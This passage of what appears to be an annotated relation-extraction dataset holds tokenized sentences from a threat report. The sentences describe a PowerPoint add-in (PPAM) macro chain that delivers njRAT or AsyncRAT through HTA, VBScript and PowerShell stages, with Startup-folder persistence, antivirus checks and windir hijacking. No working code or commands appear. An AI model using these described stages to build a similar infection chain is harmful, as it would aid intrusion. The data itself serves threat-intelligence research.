"h": 13}, {"r": "WR", "evidence": [3], "h": 13, "t": 14}, {"r": "WR", "evidence": [3], "h": 13, "t": 15}, {"r": "EX", "evidence": [3], "h": 13, "t": 15}, {"r": "ST", "evidence": [3], "h": 13, "t": 16}, {"r": "RF", "evidence": [3], "h": 13, "t": 16}, {"r": "EX", "evidence": [4], "h": 17, "t": 19}, {"r": "RD", "evidence": [4], "t": 19, "h": 20}, {"r": "WR", "evidence": [4], "h": 17, "t": 21}, {"r": "EX", "evidence": [4], "h": 17, "t": 21}, {"r": "WR", "evidence": [4], "h": 20, "t": 21}, {"r": "WR", "evidence": [4, 5], "h": 20, "t": 22}, {"r": "CO", "evidence": [4], "h": 17, "t": 18}, {"r": "WR", "evidence": [5, 6], "t": 22, "h": 23}, {"r": "RD", "evidence": [6, 7], "h": 23, "t": 25}, {"r": "WR", "evidence": [5, 6], "t": 22, "h": 23}, {"r": "RD", "evidence": [6, 7], "h": 23, "t": 26}, {"r": "CO", "evidence": [6, 7], "h": 23, "t": 24}, {"r": "WR", "evidence": [7], "h": 24, "t": 25}, {"r": "WR", "evidence": [7], "h": 24, "t": 26}]}, {"title": "051-4", "sents": [["PPAM", "files", "are", "supplementary", "files", "utilized", "by", "Microsoft", "PowerPoint", "to", "enable", "enhanced", "functionality", ",", "including", "custom", "macros", ",", "tools", ",", "and", "commands", "."], ["The", "attack", "chain", "ultimately", "results", "in", "the", "deployment", "of", "a", "RAT", ",", "which", "could", "either", "be", "njRAT", "or", "AsyncRAT", "."], ["The", "earliest", "instance", "of", "this", "attack", "chain", "involves", "a", "malign", "macro", "within", "the", "PPAM", "file", "that", "downloads", "and", "runs", "a", "remote", "HTA", "file", "via", "an", "attacker-controlled", "location", "."], ["Stage", "1A", "of", "the", "attack", "entails", "a", "malign", "HTA", "that", "is", "an", "escaped", "JavaScript", "snippet", ",", "which", "then", "launches", "a", "VBScript", "(", "embedded", "in", "the", "HTA", ")", "to", "download", "and", "execute", "the", "next", "stage", "of", "the", "infection", "chain", "(", "Stage", "#", "2", "PowerShell", "script", ")", "."], ["An", "un-escaped", "VB", "code", "is", "used", "to", "download", "and", "execute", "Stage", "2", "on", "the", "endpoint", "."], ["When", "Stage", "2", "is", "initiated", ",", "a", "PowerShell", "script", "is", "executed", "on", "the", "endpoint", ",", "serving", "as", "the", "primary", "tool", "in", "the", "infection", "chain", "."], ["The", "script", "carries", "out", "several", "tasks", "on", "the", "endpoint", ",", "beginning", "by", "modifying", "the", "registry", "values", "to", "change", "the", "current", "user", "'s", "Startup", "folders", "to", "match", "those", "outlined", "in", "the", "script", "."], ["Once", "complete", ",", "a", "custom", "VBS", "file", "(", "Stage", "#", "2A", ")", "is", "created", "in", "the", "modified", "Startup", "directory", ",", "allowing", "for", "the", "execution", "of", "a", "downloaded", "PowerShell", "script", "(", "Stage", "#", "3", ":", "e.g.", ",", "``", "msi.ps1", "''", ")", "during", "subsequent", "reboots", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [0, 0], "name": "PPAM files", "pos": [0, 2], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [7, 7], "name": "Microsoft PowerPoint", "pos": [7, 9], "index": "1_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [15, 15], "name": "custom macros", "pos": [15, 17], "index": "2_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [18, 18], "name": "tools", "pos": [18, 19], "index": "3_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [21, 21], "name": "commands", "pos": [21, 22], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [24, 24], "name": "attack chain", "pos": [1, 3], "index": "5_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [39, 39], "name": "njRAT", "pos": [16, 17], "index": "6_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [41, 41], "name": "AsyncRAT", "pos": [18, 19], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [48, 48], "name": "attack chain", "pos": [5, 7], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [53, 53], "name": "macro", "pos": [10, 11], "index": "9_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [64, 64], "name": "HTA file", "pos": [21, 23], "index": "10_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [68, 68], "name": "attacker-controlled location", "pos": [25, 27], "index": "11_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [79, 79], "name": "HTA", "pos": [8, 9], "index": "12_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [84, 84], "name": "JavaScript snippet", "pos": [13, 15], "index": "13_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [91, 91], "name": "VBScript", "pos": [20, 21], "index": "14_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [107, 107], "name": "infection chain", "pos": [36, 38], "index": "15_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [113, 113], "name": "PowerShell script", "pos": [42, 44], "index": "16_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [119, 119], "name": "VB code", "pos": [2, 4], "index": "17_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [140, 140], "name": "PowerShell script", "pos": [7, 9], "index": "18_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [159, 159], "name": "script", "pos": [1, 2], "index": "19_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [172, 172], "name": "registry values", "pos": [14, 16], "index": "20_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [180, 180], "name": "Startup folders", "pos": [22, 24], "index": "21_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [195, 195], "name": "VBS file", "pos": [5, 7], "index": "22_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [217, 217], "name": "PowerShell script ( Stage", "pos": [27, 31], "index": "23_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [227, 227], "name": "msi.ps1", "pos": [37, 38], "index": "24_0"}]], "labels": [{"r": "WR", "evidence": [0], "t": 0, "h": 1}, {"r": "FR", "evidence": [0], "h": 1, "t": 2}, {"r": "FR", "evidence": [0], "h": 1, "t": 3}, {"r": "FR", "evidence": [0], "h": 1, "t": 4}, {"r": "FR", "evidence": [0, 1], "h": 4, "t": 5}, {"r": "WR", "evidence": [1], "h": 5, "t": 6}, {"r": "WR", "evidence": [1], "h": 5, "t": 6}, {"r": "WR", "evidence": [1], "h": 5, "t": 7}, {"r": "WR", "evidence": [1, 2], "t": 6, "h": 8}, {"r": "WR", "evidence": [1, 2], "t": 7, "h": 8}, {"r": "WR", "evidence": [2], "h": 8, "t": 9}, {"r": "WR", "evidence": [2], "h": 8, "t": 10}, {"r": "EX", "evidence": [2], "h": 8, "t": 10}, {"r": "ST", "evidence": [2], "h": 8, "t": 11}, {"r": "RF", "evidence": [2], "h": 8, "t": 11}, {"r": "EX", "evidence": [3], "h": 12, "t": 14}, {"r": "RD", "evidence": [3], "t": 14, "h": 15}, {"r": "WR", "evidence": [3], "h": 12, "t": 16}, {"r": "EX", "evidence": [3], "h": 12, "t": 16}, {"r": "WR", "evidence": [3], "h": 15, "t": 16}, {"r": "WR", "evidence": [3, 4], "h": 15, "t": 17}, {"r": "CO", "evidence": [3], "h": 12, "t": 13}, {"r": "WR", "evidence": [4, 5], "t": 17, "h": 18}, {"r": "RD", "evidence": [5, 6], "h": 18, "t": 20}, {"r": "WR", "evidence": [4, 5], "t": 17, "h": 18}, {"r": "RD", "evidence": [5, 6], "h": 18, "t": 21}, {"r": "CO", "evidence": [5, 6], "h": 18, "t": 19}, {"r": "WR", "evidence": [6], "h": 19, "t": 20}, {"r": "WR", "evidence": [6], "h": 19, "t": 21}, {"r": "WR", "evidence": [6, 7], "h": 19, "t": 22}, {"r": "EX", "evidence": [6, 7], "h": 19, "t": 23}, {"r": "WR", "evidence": [6, 7], "h": 19, "t": 24}]}, {"title": "051-5", "sents": [["The", "attack", "chain", "ultimately", "results", "in", "the", "deployment", "of", "a", "RAT", ",", "which", "could", "either", "be", "njRAT", "or", "AsyncRAT", "."], ["The", "earliest", "instance", "of", "this", "attack", "chain", "involves", "a", "malign", "macro", "within", "the", "PPAM", "file", "that", "downloads", "and", "runs", "a", "remote", "HTA", "file", "via", "an", "attacker-controlled", "location", "."], ["Stage", "1A", "of", "the", "attack", "entails", "a", "malign", "HTA", "that", "is", "an", "escaped", "JavaScript", "snippet", ",", "which", "then", "launches", "a", "VBScript", "(", "embedded", "in", "the", "HTA", ")", "to", "download", "and", "execute", "the", "next", "stage", "of", "the", "infection", "chain", "(", "Stage", "#", "2", "PowerShell", "script", ")", "."], ["An", "un-escaped", "VB", "code", "is", "used", "to", "download", "and", "execute", "Stage", "2", "on", "the", "endpoint", "."], ["When", "Stage", "2", "is", "initiated", ",", "a", "PowerShell", "script", "is", "executed", "on", "the", "endpoint", ",", "serving", "as", "the", "primary", "tool", "in", "the", "infection", "chain", "."], ["The", "script", "carries", "out", "several", "tasks", "on", "the", "endpoint", ",", "beginning", "by", "modifying", "the", "registry", "values", "to", "change", "the", "current", "user", "'s", "Startup", "folders", "to", "match", "those", "outlined", "in", "the", "script", "."], ["Once", "complete", ",", "a", "custom", "VBS", "file", "(", "Stage", "#", "2A", ")", "is", "created", "in", "the", "modified", "Startup", "directory", ",", "allowing", "for", "the", "execution", "of", "a", "downloaded", "PowerShell", "script", "(", "Stage", "#", "3", ":", "e.g.", ",", "``", "msi.ps1", "''", ")", "during", "subsequent", "reboots", "."], ["The", "script", "continues", "by", "checking", "for", "the", "presence", "of", "specific", "antivirus", "products", "on", "the", "endpoint", ".", "Based", "on", "the", "antivirus", "product", ",", "the", "script", "downloads", "and", "executes", "a", "specific", "version", "of", "the", "PS1", "file", "specified", "in", "the", "previous", "step", "(", "Step", "2", "and", "Stage", "3", ",", "e.g.", ",", "``", "msi.ps1", "''", ")", ",", "subsequently", "running", "the", "VB", "script", "created", "in", "Stage", "2A", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "attack chain", "pos": [1, 3], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [16, 16], "name": "njRAT", "pos": [16, 17], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [18, 18], "name": "AsyncRAT", "pos": [18, 19], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [25, 25], "name": "attack chain", "pos": [5, 7], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [30, 30], "name": "macro", "pos": [10, 11], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [41, 41], "name": "HTA file", "pos": [21, 23], "index": "5_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [45, 45], "name": "attacker-controlled location", "pos": [25, 27], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [56, 56], "name": "HTA", "pos": [8, 9], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [61, 61], "name": "JavaScript snippet", "pos": [13, 15], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [68, 68], "name": "VBScript", "pos": [20, 21], "index": "9_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [84, 84], "name": "infection chain", "pos": [36, 38], "index": "10_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [90, 90], "name": "PowerShell script", "pos": [42, 44], "index": "11_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [96, 96], "name": "VB code", "pos": [2, 4], "index": "12_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [117, 117], "name": "PowerShell script", "pos": [7, 9], "index": "13_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [136, 136], "name": "script", "pos": [1, 2], "index": "14_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [149, 149], "name": "registry values", "pos": [14, 16], "index": "15_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [157, 157], "name": "Startup folders", "pos": [22, 24], "index": "16_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [172, 172], "name": "VBS file", "pos": [5, 7], "index": "17_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [194, 194], "name": "PowerShell script ( Stage", "pos": [27, 31], "index": "18_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [204, 204], "name": "msi.ps1", "pos": [37, 38], "index": "19_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [212, 212], "name": "script", "pos": [1, 2], "index": "20_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [225, 225], "name": "endpoint", "pos": [14, 15], "index": "21_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [234, 234], "name": "script", "pos": [23, 24], "index": "22_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [243, 243], "name": "PS1 file", "pos": [32, 34], "index": "23_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [260, 260], "name": "msi.ps1", "pos": [49, 50], "index": "24_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [267, 267], "name": "VB script", "pos": [56, 58], "index": "25_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 2}, {"r": "WR", "evidence": [0, 1], "t": 1, "h": 3}, {"r": "WR", "evidence": [0, 1], "t": 2, "h": 3}, {"r": "WR", "evidence": [1], "h": 3, "t": 4}, {"r": "WR", "evidence": [1], "h": 3, "t": 5}, {"r": "EX", "evidence": [1], "h": 3, "t": 5}, {"r": "ST", "evidence": [1], "h": 3, "t": 6}, {"r": "RF", "evidence": [1], "h": 3, "t": 6}, {"r": "EX", "evidence": [2], "h": 7, "t": 9}, {"r": "RD", "evidence": [2], "t": 9, "h": 10}, {"r": "WR", "evidence": [2], "h": 7, "t": 11}, {"r": "EX", "evidence": [2], "h": 7, "t": 11}, {"r": "WR", "evidence": [2], "h": 10, "t": 11}, {"r": "WR", "evidence": [2, 3], "h": 10, "t": 12}, {"r": "CO", "evidence": [2], "h": 7, "t": 8}, {"r": "WR", "evidence": [3, 4], "t": 12, "h": 13}, {"r": "RD", "evidence": [4, 5], "h": 13, "t": 15}, {"r": "WR", "evidence": [3, 4], "t": 12, "h": 13}, {"r": "RD", "evidence": [4, 5], "h": 13, "t": 16}, {"r": "CO", "evidence": [4, 5], "h": 13, "t": 14}, {"r": "WR", "evidence": [5], "h": 14, "t": 15}, {"r": "WR", "evidence": [5], "h": 14, "t": 16}, {"r": "WR", "evidence": [5, 6], "h": 14, "t": 17}, {"r": "EX", "evidence": [5, 6], "h": 14, "t": 18}, {"r": "WR", "evidence": [5, 6], "h": 14, "t": 19}, {"r": "WR", "evidence": [6, 7], "t": 19, "h": 20}, {"r": "ST", "evidence": [7], "h": 20, "t": 21}, {"r": "RF", "evidence": [7], "h": 20, "t": 21}, {"r": "WR", "evidence": [7], "h": 22, "t": 23}, {"r": "WR", "evidence": [7], "h": 22, "t": 24}, {"r": "EX", "evidence": [7], "h": 22, "t": 25}, {"r": "CO", "evidence": [7], "h": 20, "t": 22}]}, {"title": "051-6", "sents": [["The", "earliest", "instance", "of", "this", "attack", "chain", "involves", "a", "malign", "macro", "within", "the", "PPAM", "file", "that", "downloads", "and", "runs", "a", "remote", "HTA", "file", "via", "an", "attacker-controlled", "location", "."], ["Stage", "1A", "of", "the", "attack", "entails", "a", "malign", "HTA", "that", "is", "an", "escaped", "JavaScript", "snippet", ",", "which", "then", "launches", "a", "VBScript", "(", "embedded", "in", "the", "HTA", ")", "to", "download", "and", "execute", "the", "next", "stage", "of", "the", "infection", "chain", "(", "Stage", "#", "2", "PowerShell", "script", ")", "."], ["An", "un-escaped", "VB", "code", "is", "used", "to", "download", "and", "execute", "Stage", "2", "on", "the", "endpoint", "."], ["When", "Stage", "2", "is", "initiated", ",", "a", "PowerShell", "script", "is", "executed", "on", "the", "endpoint", ",", "serving", "as", "the", "primary", "tool", "in", "the", "infection", "chain", "."], ["The", "script", "carries", "out", "several", "tasks", "on", "the", "endpoint", ",", "beginning", "by", "modifying", "the", "registry", "values", "to", "change", "the", "current", "user", "'s", "Startup", "folders", "to", "match", "those", "outlined", "in", "the", "script", "."], ["Once", "complete", ",", "a", "custom", "VBS", "file", "(", "Stage", "#", "2A", ")", "is", "created", "in", "the", "modified", "Startup", "directory", ",", "allowing", "for", "the", "execution", "of", "a", "downloaded", "PowerShell", "script", "(", "Stage", "#", "3", ":", "e.g.", ",", "``", "msi.ps1", "''", ")", "during", "subsequent", "reboots", "."], ["The", "script", "continues", "by", "checking", "for", "the", "presence", "of", "specific", "antivirus", "products", "on", "the", "endpoint", ".", "Based", "on", "the", "antivirus", "product", ",", "the", "script", "downloads", "and", "executes", "a", "specific", "version", "of", "the", "PS1", "file", "specified", "in", "the", "previous", "step", "(", "Step", "2", "and", "Stage", "3", ",", "e.g.", ",", "``", "msi.ps1", "''", ")", ",", "subsequently", "running", "the", "VB", "script", "created", "in", "Stage", "2A", "."], ["If", "there", "are", "no", "antivirus", "products", "detected", "on", "the", "endpoint", ",", "the", "script", "generates", "four", "configuration", "scripts", "on", "the", "endpoint", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [5, 5], "name": "attack chain", "pos": [5, 7], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [10, 10], "name": "macro", "pos": [10, 11], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [21, 21], "name": "HTA file", "pos": [21, 23], "index": "2_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [25, 25], "name": "attacker-controlled location", "pos": [25, 27], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [36, 36], "name": "HTA", "pos": [8, 9], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [41, 41], "name": "JavaScript snippet", "pos": [13, 15], "index": "5_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [48, 48], "name": "VBScript", "pos": [20, 21], "index": "6_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [64, 64], "name": "infection chain", "pos": [36, 38], "index": "7_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [70, 70], "name": "PowerShell script", "pos": [42, 44], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [76, 76], "name": "VB code", "pos": [2, 4], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [97, 97], "name": "PowerShell script", "pos": [7, 9], "index": "10_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [116, 116], "name": "script", "pos": [1, 2], "index": "11_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [129, 129], "name": "registry values", "pos": [14, 16], "index": "12_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [137, 137], "name": "Startup folders", "pos": [22, 24], "index": "13_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [152, 152], "name": "VBS file", "pos": [5, 7], "index": "14_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [174, 174], "name": "PowerShell script ( Stage", "pos": [27, 31], "index": "15_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [184, 184], "name": "msi.ps1", "pos": [37, 38], "index": "16_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [192, 192], "name": "script", "pos": [1, 2], "index": "17_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [205, 205], "name": "endpoint", "pos": [14, 15], "index": "18_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [214, 214], "name": "script", "pos": [23, 24], "index": "19_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [223, 223], "name": "PS1 file", "pos": [32, 34], "index": "20_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [240, 240], "name": "msi.ps1", "pos": [49, 50], "index": "21_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [247, 247], "name": "VB script", "pos": [56, 58], "index": "22_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [263, 263], "name": "endpoint", "pos": [9, 10], "index": "23_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [266, 266], "name": "script", "pos": [12, 13], "index": "24_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [269, 269], "name": "configuration scripts", "pos": [15, 17], "index": "25_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 2}, {"r": "EX", "evidence": [0], "h": 0, "t": 2}, {"r": "ST", "evidence": [0], "h": 0, "t": 3}, {"r": "RF", "evidence": [0], "h": 0, "t": 3}, {"r": "EX", "evidence": [1], "h": 4, "t": 6}, {"r": "RD", "evidence": [1], "t": 6, "h": 7}, {"r": "WR", "evidence": [1], "h": 4, "t": 8}, {"r": "EX", "evidence": [1], "h": 4, "t": 8}, {"r": "WR", "evidence": [1], "h": 7, "t": 8}, {"r": "WR", "evidence": [1, 2], "h": 7, "t": 9}, {"r": "CO", "evidence": [1], "h": 4, "t": 5}, {"r": "WR", "evidence": [2, 3], "t": 9, "h": 10}, {"r": "RD", "evidence": [3, 4], "h": 10, "t": 12}, {"r": "WR", "evidence": [2, 3], "t": 9, "h": 10}, {"r": "RD", "evidence": [3, 4], "h": 10, "t": 13}, {"r": "CO", "evidence": [3, 4], "h": 10, "t": 11}, {"r": "WR", "evidence": [4], "h": 11, "t": 12}, {"r": "WR", "evidence": [4], "h": 11, "t": 13}, {"r": "WR", "evidence": [4, 5], "h": 11, "t": 14}, {"r": "EX", "evidence": [4, 5], "h": 11, "t": 15}, {"r": "WR", "evidence": [4, 5], "h": 11, "t": 16}, {"r": "WR", "evidence": [5, 6], "t": 16, "h": 17}, {"r": "ST", "evidence": [6], "h": 17, "t": 18}, {"r": "RF", "evidence": [6], "h": 17, "t": 18}, {"r": "WR", "evidence": [6], "h": 19, "t": 20}, {"r": "WR", "evidence": [6], "h": 19, "t": 21}, {"r": "EX", "evidence": [6], "h": 19, "t": 22}, {"r": "CO", "evidence": [6], "h": 17, "t": 19}, {"r": "CO", "evidence": [6, 7], "h": 18, "t": 23}, {"r": "ST", "evidence": [7], "t": 23, "h": 24}, {"r": "RF", "evidence": [7], "t": 23, "h": 24}, {"r": "WR", "evidence": [7], "h": 24, "t": 25}]}, {"title": "051-7", "sents": [["Stage", "1A", "of", "the", "attack", "entails", "a", "malign", "HTA", "that", "is", "an", "escaped", "JavaScript", "snippet", ",", "which", "then", "launches", "a", "VBScript", "(", "embedded", "in", "the", "HTA", ")", "to", "download", "and", "execute", "the", "next", "stage", "of", "the", "infection", "chain", "(", "Stage", "#", "2", "PowerShell", "script", ")", "."], ["An", "un-escaped", "VB", "code", "is", "used", "to", "download", "and", "execute", "Stage", "2", "on", "the", "endpoint", "."], ["When", "Stage", "2", "is", "initiated", ",", "a", "PowerShell", "script", "is", "executed", "on", "the", "endpoint", ",", "serving", "as", "the", "primary", "tool", "in", "the", "infection", "chain", "."], ["The", "script", "carries", "out", "several", "tasks", "on", "the", "endpoint", ",", "beginning", "by", "modifying", "the", "registry", "values", "to", "change", "the", "current", "user", "'s", "Startup", "folders", "to", "match", "those", "outlined", "in", "the", "script", "."], ["Once", "complete", ",", "a", "custom", "VBS", "file", "(", "Stage", "#", "2A", ")", "is", "created", "in", "the", "modified", "Startup", "directory", ",", "allowing", "for", "the", "execution", "of", "a", "downloaded", "PowerShell", "script", "(", "Stage", "#", "3", ":", "e.g.", ",", "``", "msi.ps1", "''", ")", "during", "subsequent", "reboots", "."], ["The", "script", "continues", "by", "checking", "for", "the", "presence", "of", "specific", "antivirus", "products", "on", "the", "endpoint", ".", "Based", "on", "the", "antivirus", "product", ",", "the", "script", "downloads", "and", "executes", "a", "specific", "version", "of", "the", "PS1", "file", "specified", "in", "the", "previous", "step", "(", "Step", "2", "and", "Stage", "3", ",", "e.g.", ",", "``", "msi.ps1", "''", ")", ",", "subsequently", "running", "the", "VB", "script", "created", "in", "Stage", "2A", "."], ["If", "there", "are", "no", "antivirus", "products", "detected", "on", "the", "endpoint", ",", "the", "script", "generates", "four", "configuration", "scripts", "on", "the", "endpoint", "."], ["Script", "1", "modifies", "the", "``", "windir", "''", "path", ",", "allowing", "the", "script", "to", "execute", "itself", "when", "a", "user", "or", "application", "accesses", "the", "``", "windir", "''", "environment", "variable", ",", "while", "also", "running", "Script", "3", "in", "the", "event", "that", "the", "current", "user", "has", "administrator", "credentials", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [8, 8], "name": "HTA", "pos": [8, 9], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [13, 13], "name": "JavaScript snippet", "pos": [13, 15], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [20, 20], "name": "VBScript", "pos": [20, 21], "index": "2_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [36, 36], "name": "infection chain", "pos": [36, 38], "index": "3_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [42, 42], "name": "PowerShell script", "pos": [42, 44], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [48, 48], "name": "VB code", "pos": [2, 4], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [69, 69], "name": "PowerShell script", "pos": [7, 9], "index": "6_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [88, 88], "name": "script", "pos": [1, 2], "index": "7_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [101, 101], "name": "registry values", "pos": [14, 16], "index": "8_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [109, 109], "name": "Startup folders", "pos": [22, 24], "index": "9_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [124, 124], "name": "VBS file", "pos": [5, 7], "index": "10_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [146, 146], "name": "PowerShell script ( Stage", "pos": [27, 31], "index": "11_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [156, 156], "name": "msi.ps1", "pos": [37, 38], "index": "12_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [164, 164], "name": "script", "pos": [1, 2], "index": "13_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [177, 177], "name": "endpoint", "pos": [14, 15], "index": "14_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [186, 186], "name": "script", "pos": [23, 24], "index": "15_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [195, 195], "name": "PS1 file", "pos": [32, 34], "index": "16_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [212, 212], "name": "msi.ps1", "pos": [49, 50], "index": "17_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [219, 219], "name": "VB script", "pos": [56, 58], "index": "18_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [235, 235], "name": "endpoint", "pos": [9, 10], "index": "19_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [238, 238], "name": "script", "pos": [12, 13], "index": "20_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [241, 241], "name": "configuration scripts", "pos": [15, 17], "index": "21_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [247, 247], "name": "Script", "pos": [0, 1], "index": "22_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [252, 252], "name": "windir", "pos": [5, 6], "index": "23_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [270, 270], "name": "windir", "pos": [23, 24], "index": "24_0"}]], "labels": [{"r": "EX", "evidence": [0], "h": 0, "t": 2}, {"r": "RD", "evidence": [0], "t": 2, "h": 3}, {"r": "WR", "evidence": [0], "h": 0, "t": 4}, {"r": "EX", "evidence": [0], "h": 0, "t": 4}, {"r": "WR", "evidence": [0], "h": 3, "t": 4}, {"r": "WR", "evidence": [0, 1], "h": 3, "t": 5}, {"r": "CO", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [1, 2], "t": 5, "h": 6}, {"r": "RD", "evidence": [2, 3], "h": 6, "t": 8}, {"r": "WR", "evidence": [1, 2], "t": 5, "h": 6}, {"r": "RD", "evidence": [2, 3], "h": 6, "t": 9}, {"r": "CO", "evidence": [2, 3], "h": 6, "t": 7}, {"r": "WR", "evidence": [3], "h": 7, "t": 8}, {"r": "WR", "evidence": [3], "h": 7, "t": 9}, {"r": "WR", "evidence": [3, 4], "h": 7, "t": 10}, {"r": "EX", "evidence": [3, 4], "h": 7, "t": 11}, {"r": "WR", "evidence": [3, 4], "h": 7, "t": 12}, {"r": "WR", "evidence": [4, 5], "t": 12, "h": 13}, {"r": "ST", "evidence": [5], "h": 13, "t": 14}, {"r": "RF", "evidence": [5], "h": 13, "t": 14}, {"r": "WR", "evidence": [5], "h": 15, "t": 16}, {"r": "WR", "evidence": [5], "h": 15, "t": 17}, {"r": "EX", "evidence": [5], "h": 15, "t": 18}, {"r": "RD", "evidence": [5, 6, 7], "h": 13, "t": 23}, {"r": "WR", "evidence": [5, 6, 7], "h": 15, "t": 23}, {"r": "CO", "evidence": [5], "h": 13, "t": 15}, {"r": "CO", "evidence": [5, 6], "h": 14, "t": 19}, {"r": "ST", "evidence": [6], "t": 19, "h": 20}, {"r": "RF", "evidence": [6], "t": 19, "h": 20}, {"r": "WR", "evidence": [6], "h": 20, "t": 21}, {"r": "WR", "evidence": [6, 7], "h": 20, "t": 22}, {"r": "RD", "evidence": [6, 7], "h": 20, "t": 24}, {"r": "RD", "evidence": [6, 7], "h": 20, "t": 24}, {"r": "WR", "evidence": [6, 7], "h": 20, "t": 24}]}, {"title": "051-8", "sents": [["An", "un-escaped", "VB", "code", "is", "used", "to", "download", "and", "execute", "Stage", "2", "on", "the", "endpoint", "."], ["When", "Stage", "2", "is", "initiated", ",", "a", "PowerShell", "script", "is", "executed", "on", "the", "endpoint", ",", "serving", "as", "the", "primary", "tool", "in", "the", "infection", "chain", "."], ["The", "script", "carries", "out", "several", "tasks", "on", "the", "endpoint", 